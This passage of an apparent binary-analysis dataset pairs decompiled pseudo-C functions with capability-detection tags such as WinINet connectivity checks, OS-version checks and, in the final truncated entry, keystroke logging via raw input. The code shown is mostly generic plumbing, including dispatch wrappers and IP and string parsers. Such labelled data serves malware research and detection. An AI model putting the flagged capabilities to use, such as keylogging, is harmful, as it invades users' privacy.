        "decompiled_code": "\nuint __cdecl fcn.00076ff0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar1 = false;\n    while( true ) {\n        if (bVar1) {\n            return 0;\n        }\n        uVar2 = arg_8h >> 0x1f;\n        if (*0x800b9010 == arg_8h) break;\n        if (arg_8h == 0xffffffff) {\n            fcn.0002c4c0(arg_10h, arg_14h, 0x80055a2c, arg_ch);\n        }\n        else if ((arg_8h ^ uVar2) - uVar2 < 0x186a1) {\n            fcn.0002c4c0(arg_10h, arg_14h, 0x80055a2c, arg_ch);\n        }\n        else {\n            fcn.0002c4c0(arg_10h, arg_14h, 0x80055a38, arg_ch);\n        }\n        bVar1 = true;\n    }\n    if (arg_8h == 0xffffffff) {\n        fcn.0002c4c0(arg_10h, arg_14h, 0x80055a10, arg_ch);\n    }\n    else if ((arg_8h ^ uVar2) - uVar2 < 0x186a1) {\n        fcn.0002c4c0(arg_10h, arg_14h, 0x80055a10, arg_ch);\n    }\n    else {\n        fcn.0002c4c0(arg_10h, arg_14h, 0x80055a1c, arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 426
    },
    "00077170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00077170(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    var_4h = 0;\n    while( true ) {\n        if (*(arg_ch + var_4h * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035820(*(arg_ch + var_4h * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_10h = fcn.00078a44(arg_8h_00, 0x2e);\n        if (var_10h != NULL) {\n            *var_10h = 0;\n            var_10h = var_10h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_18h;\n        var_18h = fcn.00075cd0(arg_8h_00);\n        if (var_18h == 0) {\n            fcn.000357f0(arg_8h_00);\n            var_ch = 0x21590005;\n            if ((*0x800b90ac != 0) &&\n               (var_ch = (**(*0x800b90ac + 0xc))\n                                   (arg_8h, *(arg_ch + var_4h * 4), arg_10h, arg_14h, arg_18h, pcVar3, uVar4), \n               var_ch == 0)) {\n                var_18h = *0x800b90ac;\n            }\n            if ((var_18h == 0) && (var_ch != 0x21590005)) {\n                return var_ch;\n            }\n        }\n        else {\n            if (var_10h == NULL) {\n                var_1ch = arg_8h_00;\n                do {\n                    cVar1 = *var_1ch;\n                    var_1ch = var_1ch + 1;\n                } while (cVar1 != '\\0');\n                var_8h = var_1ch - (arg_8h_00 + 1);\n            }\n            else {\n                var_8h = var_10h - arg_8h_00;\n            }\n            fcn.000357f0(arg_8h_00);\n            var_ch = (**(var_18h + 0xc))(arg_8h, *(arg_ch + var_4h * 4) + var_8h, arg_10h, arg_14h, arg_18h);\n        }\n        if (var_18h != 0) break;\n        var_4h = var_4h + 1;\n    }\n    if (var_ch != 0) {\n        return var_ch;\n    }\n    iVar2 = fcn.00077500(*arg_8h, var_18h);\n    if (iVar2 != 0) {\n        return 0;\n    }\n    (**(var_18h + 0x18))(*arg_8h, 0);\n    *arg_8h = 0;\n    return 0x21590004;\n}\n",
        "token_count": 841
    },
    "00077340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00077340(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    var_4h = 0;\n    while( true ) {\n        if (*(arg_ch + var_4h * 4) == 0) {\n            return 0x21590005;\n        }\n        var_1ch = fcn.00035820(*(arg_ch + var_4h * 4));\n        if (var_1ch == NULL) {\n            return 0x21590004;\n        }\n        var_10h = fcn.00078a44(var_1ch, 0x2e);\n        if (var_10h != NULL) {\n            *var_10h = 0;\n            var_10h = var_10h + 1;\n        }\n        pcVar2 = var_1ch;\n        uVar4 = arg_18h;\n        var_18h = fcn.00075cd0(var_1ch);\n        fcn.000357f0(var_1ch);\n        if (var_18h == 0) {\n            var_ch = 0x21590005;\n            if ((*0x800b90ac != 0) &&\n               (var_ch = (**(*0x800b90ac + 0x10))\n                                   (arg_8h, *(arg_ch + var_4h * 4), arg_10h, arg_14h, arg_18h, pcVar2, uVar4), \n               var_ch == 0)) {\n                var_18h = *0x800b90ac;\n            }\n            if ((var_18h == 0) && (var_ch != 0x21590005)) {\n                return var_ch;\n            }\n        }\n        else {\n            if (var_10h == NULL) {\n                pcVar2 = var_1ch + 1;\n                do {\n                    cVar1 = *var_1ch;\n                    var_1ch = var_1ch + 1;\n                } while (cVar1 != '\\0');\n                var_8h = var_1ch - pcVar2;\n            }\n            else {\n                var_8h = var_10h - var_1ch;\n            }\n            var_ch = (**(var_18h + 0x10))(arg_8h, *(arg_ch + var_4h * 4) + var_8h, arg_10h, arg_14h, arg_18h);\n        }\n        if (var_18h != 0) break;\n        var_4h = var_4h + 1;\n    }\n    if (var_ch != 0) {\n        return var_ch;\n    }\n    iVar3 = fcn.00077500(*arg_8h, var_18h);\n    if (iVar3 != 0) {\n        return 0;\n    }\n    (**(var_18h + 0x18))(*arg_8h, 0);\n    *arg_8h = 0;\n    return 0x21590004;\n}\n",
        "token_count": 797
    },
    "00077500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077500(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x20);\n    if (arg_8h_00 == NULL) {\n        uVar1 = 0;\n    }\n    else {\n        *arg_8h_00 = arg_ch;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        fcn.00036ed0(arg_8h_00 + 1);\n        fcn.000349b0(arg_8h_00 + 7);\n        *arg_8h = arg_8h_00;\n        iVar2 = fcn.0006d170(arg_8h, 3);\n        if (iVar2 == 0) {\n            fcn.00036f40(arg_8h_00 + 1);\n            fcn.000349e0(arg_8h_00 + 7);\n            fcn.000357f0(arg_8h_00);\n            *arg_8h = 0;\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 313
    },
    "000775b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000775b0(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034a10(0x800cdc24);\n    iVar1 = fcn.0006d2c0(arg_8h_00, 3);\n    if (iVar1 == 0) {\n        fcn.00034a80(0x800cdc24);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.00034a80(0x800cdc24);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00037100(arg_8h_01 + 1);\n            fcn.00034a10(0x800cdc24);\n            *arg_8h = NULL;\n            fcn.0006d200(arg_8h_00, 3);\n            fcn.00034a80(0x800cdc24);\n            (**(**arg_8h_00 + 0x18))(arg_8h_00, arg_ch);\n            fcn.00037190(arg_8h_01 + 1);\n            fcn.00036f40(arg_8h_01 + 1);\n            fcn.000349e0(arg_8h_01 + 7);\n            fcn.000357f0(arg_8h_01);\n        }\n        else {\n            fcn.00034a80(0x800cdc24);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "000776c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000776c0(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 274
    },
    "00077780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077780(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x48) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x48) != 0)) {\n            var_4h = (**(**arg_8h + 0x48))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 295
    },
    "000778a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000778a0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 285
    },
    "00077970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.00077970(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch, uint *arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))\n                               (arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n            if ((var_4h == 0) && (*arg_1ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_1ch = 0;\n                *arg_20h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 460
    },
    "00077a90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077a90(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x30) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x30) != 0)) {\n            var_4h = (**(**arg_8h + 0x30))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 307
    },
    "00077b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00077b60(int32_t **arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x34) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x34) != 0)) {\n            var_4h = (**(**arg_8h + 0x34))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_4h == 0) && (*arg_10h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_10h = 0;\n                *arg_14h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 421
    },
    "00077c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00077c70(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n            var_4h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 296
    },
    "00077d40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.00077d40(int32_t **arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint *arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00077f10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if ((var_4h == 0) && (*arg_14h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_14h = 0;\n                *arg_18h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 435
    },
    "00077e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00077e50(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = fcn.0006d2c0(arg_8h, 3);\n    if ((iVar2 != 0) && (arg_ch != 0)) {\n        piVar1 = *arg_8h;\n        fcn.00034a10(piVar1 + 7);\n        if (0 < piVar1[6]) {\n            piVar1[6] = piVar1[6] + -1;\n            fcn.00034a80(piVar1 + 7);\n            (**(**arg_8h + 0x44))(arg_8h, arg_ch);\n            fcn.00037020(*arg_8h + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00077f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00077f10(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034a10(0x800cdc24);\n    iVar1 = fcn.0006d2c0(arg_8h, 3);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036f70(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.00034a80(0x800cdc24);\n    return var_4h;\n}\n",
        "token_count": 186
    },
    "00078030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00078030(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00077960(arg_8h);\n    if ((*(iVar1 + 0x10) < 0x29) || (*(iVar1 + 0x28) == 0)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (**(iVar1 + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar2;\n}\n",
        "token_count": 172
    },
    "00078090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00078090(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00077960(arg_8h);\n    if ((*(iVar1 + 0x10) < 0x2d) || (*(iVar1 + 0x2c) == 0)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (**(iVar1 + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar2;\n}\n",
        "token_count": 175
    },
    "000780f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000780f0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00077960(arg_8h);\n    if ((*(iVar1 + 0x10) < 0x31) || (*(iVar1 + 0x30) == 0)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (**(iVar1 + 0x30))(arg_8h, arg_ch);\n    }\n    return uVar2;\n}\n",
        "token_count": 140
    },
    "00078140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00078140(char **arg_8h, int32_t arg_ch, uint32_t arg_10h, char **arg_14h)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_10h;\n    char *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (**arg_8h == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        var_8h = fcn.00078a44(*arg_8h, 0x3d);\n        if (var_8h == 0) {\n            if (arg_10h != 0) {\n                fcn.00078ac8(arg_ch, *arg_8h, arg_10h);\n                *(arg_ch + arg_10h + -1) = 0;\n            }\n            var_ch = *arg_8h;\n            pcVar3 = var_ch + 1;\n            do {\n                cVar1 = *var_ch;\n                var_ch = var_ch + 1;\n            } while (cVar1 != '\\0');\n            *arg_14h = *arg_8h + (var_ch - pcVar3);\n        }\n        else {\n            var_8h = var_8h - *arg_8h;\n            if (arg_10h != 0) {\n                if (arg_10h < var_8h + 1U) {\n                    var_8h = arg_10h - 1;\n                }\n                fcn.00078be8(arg_ch, *arg_8h, var_8h);\n                *(arg_ch + var_8h) = 0;\n            }\n            *arg_14h = *arg_8h + var_8h + 1;\n        }\n        var_1ch = *arg_8h;\n        pcVar3 = var_1ch + 1;\n        do {\n            cVar1 = *var_1ch;\n            var_1ch = var_1ch + 1;\n        } while (cVar1 != '\\0');\n        *arg_8h = *arg_8h + var_1ch + (1 - pcVar3);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 542
    },
    "00078270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00078270(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00078ae0(arg_8h);\n    iVar2 = fcn.00078a44(arg_8h, 0x2e);\n    if (iVar2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.00078ae0(iVar2 + 1);\n        iVar2 = fcn.00078a44(iVar2 + 1, 0x2e);\n        if (iVar2 == 0) {\n            uVar1 = 0;\n        }\n        else {\n            iVar4 = fcn.00078ae0(iVar2 + 1);\n            iVar2 = fcn.00078a44(iVar2 + 1, 0x2e);\n            if (iVar2 == 0) {\n                uVar1 = 0;\n            }\n            else {\n                iVar2 = fcn.00078ae0(iVar2 + 1);\n                if (((((uVar1 < 0) || (0xff < uVar1)) || (iVar3 < 0)) || ((0xff < iVar3 || (iVar4 < 0)))) ||\n                   ((0xff < iVar4 || ((iVar2 < 0 || (0xff < iVar2)))))) {\n                    uVar1 = 0;\n                }\n                else {\n                    uVar1 = iVar3 << 8 | uVar1 | iVar4 << 0x10 | iVar2 << 0x18;\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 419
    },
    "00078390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00078390(int32_t arg_8h, uint arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == '\\0') {\n        uVar2 = 0x215900c8;\n    }\n    else {\n        var_14h._2_2_ = 0;\n        var_10h._0_2_ = 0;\n        var_4h = fcn.00078ace(arg_8h, 0x3a, 0);\n        if (var_4h == 0) {\n            var_4h = arg_8h;\n        }\n        else {\n            iVar3 = fcn.00078270(arg_8h);\n            var_14h._2_2_ = iVar3;\n            var_10h._0_2_ = iVar3 >> 0x10;\n            if (iVar3 == 0) {\n                return 0x215900c8;\n            }\n            var_4h = var_4h + 1;\n        }\n        uVar2 = fcn.00078ae0(var_4h);\n        uVar1 = fcn.00035980(uVar2);\n        *arg_10h = 1;\n        *(arg_10h + 1) = 0xe;\n        *(arg_10h + 6) = 2;\n        arg_10h[2] = CONCAT22(var_14h._2_2_, uVar1);\n        arg_10h[3] = var_10h;\n        arg_10h[4] = 0;\n        *(arg_10h + 5) = 0;\n        *arg_14h = 0x16;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 478
    },
    "00078460": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
